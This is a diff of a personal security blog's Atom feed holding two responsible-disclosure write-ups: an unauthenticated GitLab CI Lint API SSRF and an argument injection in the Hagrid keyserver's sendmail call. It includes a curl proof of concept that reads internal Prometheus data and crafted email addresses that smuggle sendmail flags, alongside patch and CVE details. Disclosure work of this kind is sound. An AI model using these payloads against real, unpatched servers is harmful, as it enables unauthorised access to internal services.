@@ -1,95 +1,128 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://vin01.github.io/piptagole/piptagole/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vin01.github.io/piptagole/piptagole/" rel="alternate" type="text/html" /><updated>2022-01-13T20:39:17+00:00</updated><id>https://vin01.github.io/piptagole/piptagole/feed.xml</id><title type="html">Vin01’s Blog</title><subtitle>A collection of tidbits which might do some good out there or at least be interesting for some of you.</subtitle><entry><title type="html">Unauthenticated Gitlab SSRF</title><link href="https://vin01.github.io/piptagole/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html" rel="alternate" type="text/html" title="Unauthenticated Gitlab SSRF" /><published>2021-06-15T10:29:00+00:00</published><updated>2021-06-15T10:29:00+00:00</updated><id>https://vin01.github.io/piptagole/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf</id><content type="html" xml:base="https://vin01.github.io/piptagole/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html">&lt;h3 id=&quot;meet-gitlab-ci-lint-api&quot;&gt;Meet Gitlab &lt;a href=&quot;https://docs.gitlab.com/ee/api/lint.html&quot;&gt;CI Lint API&lt;/a&gt;&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://vin01.github.io/piptagole/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vin01.github.io/piptagole/" rel="alternate" type="text/html" /><updated>2023-03-17T21:59:41+00:00</updated><id>https://vin01.github.io/piptagole/feed.xml</id><title type="html">Vin01’s Blog</title><subtitle>A collection of tidbits which might do some good out there or at least be interesting for some of you.</subtitle><entry><title type="html">Argument injection in Hagrid keyserver</title><link href="https://vin01.github.io/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html" rel="alternate" type="text/html" title="Argument injection in Hagrid keyserver" /><published>2021-06-15T23:25:23+00:00</published><updated>2021-06-15T23:25:23+00:00</updated><id>https://vin01.github.io/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection</id><content type="html" xml:base="https://vin01.github.io/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html"><![CDATA[<p>### What is Hagrid ?</p>
 
-&lt;p&gt;Purpose of the CI Lint API is to validate CI/CD YAML configuration for Gitlab.&lt;/p&gt;
+<p>Hagrid as in, “keeper of keys” is a verifying OpenPGP keyserver, written in Rust, powered by <a href="https://sequoia-pgp.org/">Sequoia-PGP</a> running on .</p>
 
-&lt;p&gt;A usual request to this API would validate YAML payload and provide the result accordingly.&lt;/p&gt;
+<p>It was <a href="https://keys.openpgp.org/about/news#2019-06-12-launch">launched</a> on 12 June 2019.</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;--header&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/json&quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;https://gitlab.example.com/api/v4/ci/lint&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{&quot;content&quot;: &quot;{ \&quot;image\&quot;: \&quot;ruby:2.6\&quot;, \&quot;services\&quot;: [\&quot;postgres\&quot;], \&quot;before_script\&quot;: [\&quot;bundle install\&quot;, \&quot;bundle exec rake db:create\&quot;], \&quot;variables\&quot;: {\&quot;DB_NAME\&quot;: \&quot;postgres\&quot;}, \&quot;types\&quot;: [\&quot;test\&quot;, \&quot;deploy\&quot;, \&quot;notify\&quot;], \&quot;rspec\&quot;: { \&quot;script\&quot;: \&quot;rake spec\&quot;, \&quot;tags\&quot;: [\&quot;ruby\&quot;, \&quot;postgres\&quot;], \&quot;only\&quot;: [\&quot;branches\&quot;]}}&quot;}&apos;&lt;/span&gt;
+<p>It is supposed to replace <a href="https://unix.stackexchange.com/questions/656205/sks-keyservers-gone-what-to-use-instead">SKS key server</a>.</p>
 
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;valid&quot;&lt;/span&gt;,
-  &lt;span class=&quot;s2&quot;&gt;&quot;errors&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;,
-  &lt;span class=&quot;s2&quot;&gt;&quot;warnings&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<h3 id="digging-deeper">Digging deeper</h3>
 
-&lt;p&gt;&lt;em&gt;Note: prior to this patch, this endpoint did not require any authentication&lt;/em&gt;&lt;/p&gt;
+<p>I wanted to take a closer look to find potential security flaws. A key feature potentially with lot of room for vulnerabilities was emali verification. Hagrid supports verifying user IDs with email verification by following a link sent to user’s email address.</p>
 
-&lt;h3 id=&quot;meet-remote-yaml-includes-in-gitlab-ci-configuration-files&quot;&gt;Meet &lt;a href=&quot;https://docs.gitlab.com/ee/ci/yaml/includes.html#single-string-or-array-of-multiple-values&quot;&gt;Remote YAML includes&lt;/a&gt; in Gitlab Ci configuration files&lt;/h3&gt;
+<p>Hagrid uses <code class="language-plaintext highlighter-rouge">sendmail</code> for mailing.</p>
 
-&lt;p&gt;CI configuration files for Gitlab are YAML and can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt; tag to include YAML templates from remote URLs.&lt;/p&gt;
+<p>I also tested <a href="https://marlam.de/msmtp/">msmtp</a> which can be used as <code class="language-plaintext highlighter-rouge">sendmail</code> replacement for Hagrid integration.</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;include:
-  - &lt;span class=&quot;s1&quot;&gt;&apos;https://gitlab.com/awesome-project/raw/main/.before-script-template.yml&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<h3 id="vulnerability">Vulnerability</h3>
 
-&lt;h3 id=&quot;ssrf&quot;&gt;SSRF!&lt;/h3&gt;
+<p>Hagrid uses <a href="https://github.com/lettre/lettre">lettre</a> mailing library.</p>
 
-&lt;p&gt;If you haven’t already figured, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt; can also point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; ..&lt;/p&gt;
+<p>By crafting email addresses like following, it was possible to make <code class="language-plaintext highlighter-rouge">lettre</code> inject arbitrary flags into final <code class="language-plaintext highlighter-rouge">sendmail</code> command.</p>
 
-&lt;p&gt;SSRF proof-of-concept to dump Prometheus targets from the Prometheus API by abusing this vulnerability.&lt;/p&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<p>-bi@example.com    (-bi: Initialize the alias database.)
+-d0.1a@example.com (The option -d0.1 prints the version of sendmail and the options it was compiled with.)</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--show-error&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/json&apos;&lt;/span&gt; https://gitlab.example.com/api/v4/ci/lint &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{ &quot;include_merged_yaml&quot;: true, &quot;content&quot;: &quot;include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml&quot; }&apos;&lt;/span&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
 
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;invalid&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;errors&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;jobs status config should implement a script: or a trigger: keyword&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;jobs data config should implement a script: or a trigger: keyword&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;jobs config should contain at least one visible job&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;warnings&quot;&lt;/span&gt;:[],&lt;span class=&quot;s2&quot;&gt;&quot;merged_yaml&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;status: success&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  activeTargets:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  - discoveredLabels:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;      __address__: ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<p>Strace dump from the server running injected sendmail flags:</p>
 
-&lt;p&gt;&lt;em&gt;Note: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.yml&lt;/code&gt; is essential part of the paylaod becauyse API expects &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yml&lt;/code&gt; extension for validation of remote YAML file&lt;/em&gt;&lt;/p&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<p>28329 execve(“/usr/sbin/sendmail”, [“/usr/sbin/sendmail”, “-i”, “-f”, “noreply@localhost”, “-bi@example.com”], 0x7ffcc8ada608 /* 23 vars */ 
+28329 sendto(3, “Nov  4 16:48:22 sendmail[28329]: user 1000 attempted to rebuild the alias map”, 81, MSG_NOSIGNAL, NULL, 0) = 81</p>
 
-&lt;p&gt;This is only exploitable if &lt;a href=&quot;https://docs.gitlab.com/ee/security/webhooks.html&quot;&gt;internal network requests are enabled&lt;/a&gt; in Gitlab (they are disabled by default). It turns out to be a quite widely enabled option though, as internal requests are useful for webhooks, CI operations.&lt;/p&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
 
-&lt;h3 id=&quot;disclosure-impact-and-remediation&quot;&gt;Disclosure, impact and remediation&lt;/h3&gt;
+<p>A simple fix was to use <code class="language-plaintext highlighter-rouge">sendmail</code>’s <code class="language-plaintext highlighter-rouge">--</code> flag to treat argument <em>only</em> as an email address.</p>
 
-&lt;p&gt;I disclosed it in December 2020 and first patch was out in &lt;a href=&quot;https://about.gitlab.com/releases/2021/02/11/security-release-gitlab-13-8-4-released/&quot;&gt;February 2021&lt;/a&gt;, second complete patch followed in &lt;a href=&quot;https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/&quot;&gt;June&lt;/a&gt; recently. Gitlab team was very supportive and responsive as always ❤️  Thank you for the bounties and swag &lt;a href=&quot;https://twitter.com/gitlab&quot;&gt;Team Gitlab&lt;/a&gt;.&lt;/p&gt;
+<p>From <code class="language-plaintext highlighter-rouge">man</code>:</p>
 
-&lt;p&gt;Wide use of the unauthenticated CI Lint API also led to a lot of workflows being &lt;a href=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/321290&quot;&gt;disrupted&lt;/a&gt;.&lt;/p&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<p>–  Stop processing command flags and use the rest of the arguments as addresses.</p>
 
-&lt;p&gt;I have also disclosed it directly to &lt;strong&gt;many&lt;/strong&gt; affected organizations (universities, open source projects, governments) but vulnerable public facing instances are still out there. I did not initially intend to blog it, but looking at the number of affected instances, I think it might help spread the word.&lt;/p&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
 
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Patches before December 2021 (version 14.5.2) did not prevent attacks from &lt;a href=&quot;https://docs.gitlab.com/ee/user/permissions.html#external-users&quot;&gt;external Gitlab users&lt;/a&gt;.&lt;/p&gt;
+<h3 id="disclosure-impact-and-remediation">Disclosure, impact and remediation</h3>
 
-&lt;p&gt;&lt;strong&gt;Please apply latest gitlab security updates ASAP!&lt;/strong&gt;&lt;/p&gt;</content><author><name></name></author><category term="gitlab" /><category term="ssrf" /><category term="security" /><summary type="html">Meet Gitlab CI Lint API</summary></entry><entry><title type="html">Argument injection in Hagrid keyserver</title><link href="https://vin01.github.io/piptagole/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html" rel="alternate" type="text/html" title="Argument injection in Hagrid keyserver" /><published>2021-06-15T10:29:00+00:00</published><updated>2021-06-15T10:29:00+00:00</updated><id>https://vin01.github.io/piptagole/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection</id><content type="html" xml:base="https://vin01.github.io/piptagole/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html">&lt;h3 id=&quot;what-is-hagrid-&quot;&gt;What is Hagrid ?&lt;/h3&gt;
+<p>I disaclosed it to both Hagrid and Lettre maintainrs who weree very fast in thwir response. (5 Nov. 2020)</p>
 
-&lt;p&gt;Hagrid as in, “keeper of keys” is a verifying OpenPGP keyserver, written in Rust, powered by &lt;a href=&quot;https://sequoia-pgp.org/&quot;&gt;Sequoia-PGP&lt;/a&gt; running on &lt;a href=&quot;https://keys.openpgp.org&quot;&gt;https://keys.openpgp.org&lt;/a&gt;.&lt;/p&gt;
+<p>Vincent applied the hotfix to Hagrid <a href="https://gitlab.com/hagrid-keyserver/hagrid/-/commit/612b58dd595f42c15e6d406cf7e8e030c8461f01">on the same day</a></p>
 
-&lt;p&gt;It was &lt;a href=&quot;https://keys.openpgp.org/about/news#2019-06-12-launch&quot;&gt;launched&lt;/a&gt; on 12 June 2019.&lt;/p&gt;
+<p><a href="https://github.com/lettre/lettre/security/advisories/GHSA-vc2p-r46x-m3vx">Advisory</a> from lettre within a week.</p>
 
-&lt;p&gt;It is supposed to replace &lt;a href=&quot;https://unix.stackexchange.com/questions/656205/sks-keyservers-gone-what-to-use-instead&quot;&gt;SKS key server&lt;/a&gt;.&lt;/p&gt;
+<p>It was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28247">CVE-2020-28247</a>.</p>
 
-&lt;h3 id=&quot;digging-deeper&quot;&gt;Digging deeper&lt;/h3&gt;
+<h2 id="---vin01s-blog"><a href="/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html"></a>   Vin01’s Blog</h2>
 
-&lt;p&gt;I wanted to take a closer look to find potential security flaws. A key feature potentially with lot of room for vulnerabilities was emali verification. Hagrid supports verifying user IDs with email verification by following a link sent to user’s email address.&lt;/p&gt;
+<ul>
+  <li></li>
+  <li>
+    <p>vinci+ghp [at] protonmail.ch</p>
+  </li>
+  <li><a href="https://github.com/vin01"> vin01</a></li>
+</ul>
 
-&lt;p&gt;Hagrid uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt; for mailing.&lt;/p&gt;
+<p>A collection of tidbits which might do some good out there or at least be interesting for some of you.</p>]]></content><author><name></name></author><category term="pgp" /><category term="security" /><category term="hagrid" /><summary type="html"><![CDATA[### What is Hagrid ?]]></summary></entry><entry><title type="html">Unauthenticated Gitlab SSRF</title><link href="https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html" rel="alternate" type="text/html" title="Unauthenticated Gitlab SSRF" /><published>2021-06-15T20:25:23+00:00</published><updated>2021-06-15T20:25:23+00:00</updated><id>https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf</id><content type="html" xml:base="https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html"><![CDATA[<p>### Meet Gitlab <a href="https://docs.gitlab.com/ee/api/lint.html">CI Lint API</a></p>
 
-&lt;p&gt;I also tested &lt;a href=&quot;https://marlam.de/msmtp/&quot;&gt;msmtp&lt;/a&gt; which can be used as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt; replacement for Hagrid integration.&lt;/p&gt;
+<p>Purpose of the CI Lint API is to validate CI/CD YAML configuration for Gitlab.</p>
 
-&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;
+<p>A usual request to this API would validate YAML payload and provide the result accordingly.</p>
 
-&lt;p&gt;Hagrid uses &lt;a href=&quot;https://github.com/lettre/lettre&quot;&gt;lettre&lt;/a&gt; mailing library.&lt;/p&gt;
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span>  <span class="s2">"https://gitlab.example.com/api/v4/ci/lint"</span> <span class="nt">--data</span> <span class="s1">'{"content": "{ \"image\": \"ruby:2.6\", \"services\": [\"postgres\"], \"before_script\": [\"bundle install\", \"bundle exec rake db:create\"], \"variables\": {\"DB_NAME\": \"postgres\"}, \"types\": [\"test\", \"deploy\", \"notify\"], \"rspec\": { \"script\": \"rake spec\", \"tags\": [\"ruby\", \"postgres\"], \"only\": [\"branches\"]}}"}'</span>
 
-&lt;p&gt;By crafting email addresses like following, it was possible to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lettre&lt;/code&gt; inject arbitrary flags into final &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt; command.&lt;/p&gt;
+<span class="o">{</span>
+  <span class="s2">"status"</span>: <span class="s2">"valid"</span>,
+  <span class="s2">"errors"</span>: <span class="o">[]</span>,
+  <span class="s2">"warnings"</span>: <span class="o">[]</span>
+<span class="o">}</span>
+</code></pre></div></div>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-bi@example.com    (-bi: Initialize the alias database.)
--d0.1a@example.com (The option -d0.1 prints the version of sendmail and the options it was compiled with.)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p><em>Note: prior to this patch, this endpoint did not require any authentication</em></p>
 
-&lt;p&gt;Strace dump from the server running injected sendmail flags:&lt;/p&gt;
+<h3 id="meet-remote-yaml-includes-in-gitlab-ci-configuration-files">Meet <a href="https://docs.gitlab.com/ee/ci/yaml/includes.html#single-string-or-array-of-multiple-values">Remote YAML includes</a> in Gitlab Ci configuration files</h3>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;28329 execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-i&quot;, &quot;-f&quot;, &quot;noreply@localhost&quot;, &quot;-bi@example.com&quot;], 0x7ffcc8ada608 /* 23 vars */ &amp;lt;unfinished ...&amp;gt;
-28329 sendto(3, &quot;&amp;lt;17&amp;gt;Nov  4 16:48:22 sendmail[28329]: user 1000 attempted to rebuild the alias map&quot;, 81, MSG_NOSIGNAL, NULL, 0) = 81
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>CI configuration files for Gitlab are YAML and can use <code class="language-plaintext highlighter-rouge">include</code> tag to include YAML templates from remote URLs.</p>
 
-&lt;p&gt;A simple fix was to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt;’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; flag to treat argument &lt;em&gt;only&lt;/em&gt; as an email address.&lt;/p&gt;
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include:
+  - <span class="s1">'https://gitlab.com/awesome-project/raw/main/.before-script-template.yml'</span>
+</code></pre></div></div>
 
-&lt;p&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man&lt;/code&gt;:&lt;/p&gt;
+<h3 id="ssrf">SSRF!</h3>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--  Stop processing command flags and use the rest of the arguments as addresses. 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>If you haven’t already figured, <code class="language-plaintext highlighter-rouge">include</code> can also point to <code class="language-plaintext highlighter-rouge">192.168.1.1</code>, <code class="language-plaintext highlighter-rouge">127.0.0.1</code> ..</p>
 
-&lt;h3 id=&quot;disclosure-impact-and-remediation&quot;&gt;Disclosure, impact and remediation&lt;/h3&gt;
+<p>SSRF proof-of-concept to dump Prometheus targets from the Prometheus API by abusing this vulnerability.</p>
 
-&lt;p&gt;I disaclosed it to both Hagrid and Lettre maintainrs who weree very fast in thwir response. (5 Nov. 2020)&lt;/p&gt;
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">--show-error</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> https://gitlab.example.com/api/v4/ci/lint <span class="nt">--data</span> <span class="s1">'{ "include_merged_yaml": true, "content": "include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml" }'</span>
 
-&lt;p&gt;Vincent applied the hotfix to Hagrid &lt;a href=&quot;https://gitlab.com/hagrid-keyserver/hagrid/-/commit/612b58dd595f42c15e6d406cf7e8e030c8461f01&quot;&gt;on the same day&lt;/a&gt;&lt;/p&gt;
+<span class="o">{</span><span class="s2">"status"</span>:<span class="s2">"invalid"</span>,<span class="s2">"errors"</span>:[<span class="s2">"jobs status config should implement a script: or a trigger: keyword"</span>,<span class="s2">"jobs data config should implement a script: or a trigger: keyword"</span>,<span class="s2">"jobs config should contain at least one visible job"</span><span class="o">]</span>,<span class="s2">"warnings"</span>:[],<span class="s2">"merged_yaml"</span>:<span class="s2">"---</span><span class="se">\n</span><span class="s2">status: success</span><span class="se">\n</span><span class="s2">data:</span><span class="se">\n</span><span class="s2">  activeTargets:</span><span class="se">\n</span><span class="s2">  - discoveredLabels:</span><span class="se">\n</span><span class="s2">      __address__: ...
+</span></code></pre></div></div>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/lettre/lettre/security/advisories/GHSA-vc2p-r46x-m3vx&quot;&gt;Advisory&lt;/a&gt; from lettre within a week.&lt;/p&gt;
+<p><em>Note: <code class="language-plaintext highlighter-rouge">test.yml</code> is essential part of the paylaod becauyse API expects <code class="language-plaintext highlighter-rouge">.yml</code> extension for validation of remote YAML file</em></p>
 
-&lt;p&gt;It was assigned &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28247&quot;&gt;CVE-2020-28247&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="pgp" /><category term="security" /><category term="hagrid" /><summary type="html">What is Hagrid ?</summary></entry></feed>
+<p>This is only exploitable if <a href="https://docs.gitlab.com/ee/security/webhooks.html">internal network requests are enabled</a> in Gitlab (they are disabled by default). It turns out to be a quite widely enabled option though, as internal requests are useful for webhooks, CI operations.</p>
+
+<h3 id="disclosure-impact-and-remediation">Disclosure, impact and remediation</h3>
+
+<p>I disclosed it in December 2020 and first patch was out in <a href="https://about.gitlab.com/releases/2021/02/11/security-release-gitlab-13-8-4-released/">February 2021</a>, second complete patch followed in <a href="https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/">June</a> recently. Gitlab team was very supportive and responsive as always ❤️ Thank you for the bounties and swag <a href="https://twitter.com/gitlab">Team Gitlab</a>.</p>
+
+<p>Wide use of the unauthenticated CI Lint API also led to a lot of workflows being <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/321290">disrupted</a>.</p>
+
+<p>I have also disclosed it directly to <strong>many</strong> affected organizations (universities, open source projects, governments) but vulnerable public facing instances are still out there. I did not initially intend to blog it, but looking at the number of affected instances, I think it might help spread the word.</p>
+
+<p><strong>Update</strong>: Patches before December 2021 (version 14.5.2) did not prevent attacks from <a href="https://docs.gitlab.com/ee/user/permissions.html#external-users">external Gitlab users</a>.</p>
+
+<p><strong>Please apply latest gitlab security updates ASAP!</strong></p>
+
+<h2 id="---vin01s-blog"><a href="/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html"></a>   Vin01’s Blog</h2>
+
+<ul>
+  <li></li>
+  <li>
+    <p>vinci+ghp [at] protonmail.ch</p>
+  </li>
+  <li><a href="https://github.com/vin01"> vin01</a></li>
+</ul>
+
+<p>A collection of tidbits which might do some good out there or at least be interesting for some of you.</p>]]></content><author><name></name></author><category term="gitlab" /><category term="ssrf" /><category term="security" /><category term="bugbounty" /><summary type="html"><![CDATA[### Meet Gitlab CI Lint API]]></summary></entry></feed>
